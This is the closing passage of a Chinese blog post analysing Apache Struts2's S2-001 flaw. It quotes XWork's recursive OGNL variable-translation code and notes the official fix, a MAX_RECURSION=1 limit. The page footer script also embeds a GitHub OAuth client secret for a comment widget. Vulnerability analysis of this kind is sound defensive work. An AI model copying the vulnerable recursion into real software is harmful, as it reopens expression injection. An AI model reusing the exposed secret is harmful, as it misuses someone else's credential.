                <span class="n">c</span> <span class="o">=</span> <span class="n">expression</span><span class="o">.</span><span class="na">charAt</span><span class="o">(</span><span class="n">x</span><span class="o">++);</span>
                <span class="k">if</span> <span class="o">(</span><span class="n">c</span> <span class="o">==</span> <span class="sc">&#39;{&#39;</span><span class="o">)</span> <span class="o">{</span>
                    <span class="n">count</span><span class="o">++;</span>
                <span class="o">}</span> <span class="k">else</span> <span class="k">if</span> <span class="o">(</span><span class="n">c</span> <span class="o">==</span> <span class="sc">&#39;}&#39;</span><span class="o">)</span> <span class="o">{</span>
                    <span class="n">count</span><span class="o">--;</span>
                <span class="o">}</span>
            <span class="o">}</span>
            <span class="n">end</span> <span class="o">=</span> <span class="n">x</span> <span class="o">-</span> <span class="n">1</span><span class="o">;</span>

            <span class="k">if</span> <span class="o">((</span><span class="n">start</span> <span class="o">!=</span> <span class="o">-</span><span class="n">1</span><span class="o">)</span> <span class="o">&amp;&amp;</span> <span class="o">(</span><span class="n">end</span> <span class="o">!=</span> <span class="o">-</span><span class="n">1</span><span class="o">)</span> <span class="o">&amp;&amp;</span> <span class="o">(</span><span class="n">count</span> <span class="o">==</span> <span class="n">0</span><span class="o">))</span> <span class="o">{</span>
                <span class="n">String</span> <span class="n">var</span> <span class="o">=</span> <span class="n">expression</span><span class="o">.</span><span class="na">substring</span><span class="o">(</span><span class="n">start</span> <span class="o">+</span> <span class="n">2</span><span class="o">,</span> <span class="n">end</span><span class="o">);</span>

                <span class="n">Object</span> <span class="n">o</span> <span class="o">=</span> <span class="n">stack</span><span class="o">.</span><span class="na">findValue</span><span class="o">(</span><span class="n">var</span><span class="o">,</span> <span class="n">asType</span><span class="o">);</span>
                <span class="k">if</span> <span class="o">(</span><span class="n">evaluator</span> <span class="o">!=</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span>
                	<span class="n">o</span> <span class="o">=</span> <span class="n">evaluator</span><span class="o">.</span><span class="na">evaluate</span><span class="o">(</span><span class="n">o</span><span class="o">);</span>
                <span class="o">}</span>
                

                <span class="n">String</span> <span class="n">left</span> <span class="o">=</span> <span class="n">expression</span><span class="o">.</span><span class="na">substring</span><span class="o">(</span><span class="n">0</span><span class="o">,</span> <span class="n">start</span><span class="o">);</span>
                <span class="n">String</span> <span class="n">right</span> <span class="o">=</span> <span class="n">expression</span><span class="o">.</span><span class="na">substring</span><span class="o">(</span><span class="n">end</span> <span class="o">+</span> <span class="n">1</span><span class="o">);</span>
                <span class="n">String</span> <span class="n">middle</span> <span class="o">=</span> <span class="kc">null</span><span class="o">;</span>
                <span class="k">if</span> <span class="o">(</span><span class="n">o</span> <span class="o">!=</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span>
                    <span class="n">middle</span> <span class="o">=</span> <span class="n">o</span><span class="o">.</span><span class="na">toString</span><span class="o">();</span>
                    <span class="k">if</span> <span class="o">(!</span><span class="n">TextUtils</span><span class="o">.</span><span class="na">stringSet</span><span class="o">(</span><span class="n">left</span><span class="o">))</span> <span class="o">{</span>
                        <span class="n">result</span> <span class="o">=</span> <span class="n">o</span><span class="o">;</span>
                    <span class="o">}</span> <span class="k">else</span> <span class="o">{</span>
                        <span class="n">result</span> <span class="o">=</span> <span class="n">left</span> <span class="o">+</span> <span class="n">middle</span><span class="o">;</span>
                    <span class="o">}</span>
    
                    <span class="k">if</span> <span class="o">(</span><span class="n">TextUtils</span><span class="o">.</span><span class="na">stringSet</span><span class="o">(</span><span class="n">right</span><span class="o">))</span> <span class="o">{</span>
                        <span class="n">result</span> <span class="o">=</span> <span class="n">result</span> <span class="o">+</span> <span class="n">right</span><span class="o">;</span>
                    <span class="o">}</span>

                    <span class="n">expression</span> <span class="o">=</span> <span class="n">left</span> <span class="o">+</span> <span class="n">middle</span> <span class="o">+</span> <span class="n">right</span><span class="o">;</span>
                <span class="o">}</span> <span class="k">else</span> <span class="o">{</span>
                    <span class="c1">// the variable doesn&#39;t exist, so don&#39;t display anything
</span><span class="c1"></span>                    <span class="n">result</span> <span class="o">=</span> <span class="n">left</span> <span class="o">+</span> <span class="n">right</span><span class="o">;</span>
                    <span class="n">expression</span> <span class="o">=</span> <span class="n">left</span> <span class="o">+</span> <span class="n">right</span><span class="o">;</span>
                <span class="o">}</span>
                <span class="n">pos</span> <span class="o">=</span> <span class="o">(</span><span class="n">left</span> <span class="o">!=</span> <span class="kc">null</span> <span class="o">&amp;&amp;</span> <span class="n">left</span><span class="o">.</span><span class="na">length</span><span class="o">()</span> <span class="o">&gt;</span> <span class="n">0</span> <span class="o">?</span> <span class="n">left</span><span class="o">.</span><span class="na">length</span><span class="o">()</span> <span class="o">-</span> <span class="nl">1:</span> <span class="n">0</span><span class="o">)</span> <span class="o">+</span>
                      <span class="o">(</span><span class="n">middle</span> <span class="o">!=</span> <span class="kc">null</span> <span class="o">&amp;&amp;</span> <span class="n">middle</span><span class="o">.</span><span class="na">length</span><span class="o">()</span> <span class="o">&gt;</span> <span class="n">0</span> <span class="o">?</span> <span class="n">middle</span><span class="o">.</span><span class="na">length</span><span class="o">()</span> <span class="o">-</span> <span class="nl">1:</span> <span class="n">0</span><span class="o">)</span> <span class="o">+</span>
                      <span class="n">1</span><span class="o">;</span>
                <span class="n">pos</span> <span class="o">=</span> <span class="n">Math</span><span class="o">.</span><span class="na">max</span><span class="o">(</span><span class="n">pos</span><span class="o">,</span> <span class="n">1</span><span class="o">);</span>
            <span class="o">}</span> <span class="k">else</span> <span class="o">{</span>
                <span class="k">break</span><span class="o">;</span>
            <span class="o">}</span>
        <span class="o">}</span>

        <span class="k">return</span> <span class="n">XWorkConverter</span><span class="o">.</span><span class="na">getInstance</span><span class="o">().</span><span class="na">convertValue</span><span class="o">(</span><span class="n">stack</span><span class="o">.</span><span class="na">getContext</span><span class="o">(),</span> <span class="n">result</span><span class="o">,</span> <span class="n">asType</span><span class="o">);</span>
    <span class="o">}</span></code></pre></td></tr></table>
</div>
</div>
<p>通过阅读代码，我们已经知道Struts2官方修复的方式是增加了一个MAX_RECURSION=1常量，判断循环次数，从而避免递归循环导致ognl表达式执行.</p>

<h3 id="0x06-引用">0x06 引用</h3>

<ol>
<li><a href="https://cwiki.apache.org/confluence/display/WW/S2-001">S2-001安全公告</a></li>
<li><a href="https://blog.csdn.net/zljjava/article/details/17420809">自订标签库&ndash;TagSupport详解</a></li>
<li><a href="https://dean2021.github.io/posts/struts2-internals-readbook-note_06/">XWork框架的元素详解</a></li>
</ol>

    </article>




    <ul class="pager article-pager">
      <li class="pager-newer">
          <a href="/posts/s2-002/" data-toggle="tooltip" data-placement="top" title="Struts2框架: S2-002 漏洞详细分析">&lt; Newer</a>
      </li>
      <li class="pager-older">
        <a href="/posts/luckycat/" data-toggle="tooltip" data-placement="top" title="My Lucky Cat">Older &gt;</a>
      </li>
    </ul>

          <div id="gitalk-container"></div>
  <link rel="stylesheet" href="https://unpkg.com/gitalk/dist/gitalk.css">
  <script src="https://unpkg.com/gitalk/dist/gitalk.min.js"></script>
  <script>
var gitalk = new Gitalk({
  clientID: '2f61b9423ddfde01f318',
  clientSecret: 'ae6360004775eb79f1069c0ea047f2fcd0f8cfc7',
  repo: 'dean2021.github.io',
  owner: 'dean2021',
  admin: ['dean2021'],
  id: location.pathname,      
  distractionFreeMode: false  
})

gitalk.render('gitalk-container')
  </script>



  </div>


<div class="site-footer">
  <div class="copyright">&copy; Copyright 2018 Dean</div>
  <ul class="site-footer-items">
    <li class="site-footer-item-about"><a href="/about/" title="About">About</a></li>
  </ul>
  <div class="powerdby">
    Powered by <a href="https://gohugo.io/">Hugo</a>  and Dean
  </div>
</div>


</body>
</html>
